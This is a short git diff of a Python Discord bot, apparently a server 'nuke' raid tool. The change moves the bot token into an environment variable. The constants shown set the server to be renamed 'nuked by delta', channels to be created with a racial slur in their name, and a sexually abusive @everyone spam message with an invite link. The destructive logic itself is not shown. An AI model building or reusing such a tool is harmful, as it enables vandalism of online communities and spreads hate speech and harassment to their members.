@@ -1,11 +1,11 @@
 # Fixed Some Issues
-
+import os
 import discord
 from discord.ext import commands
 import asyncio
 
 # Replace 'your_token_here' with your bot's token 
-TOKEN = 'DISCORD_TOKEN'
+TOKEN = os.getenv("DISCORD_TOKEN")
 GUILD_NAME = 'nuked by delta'  # This is the name the server will be renamed to
 CHANNEL_NAME = 'LOL NUKED LIL NIGGER'  # This is the name for the channels to create
 SPAM_MESSAGE = "@everyone suck deltas dick suck harder https://discord.gg/K2RU5RMtqm" # This is the message that will be spammed
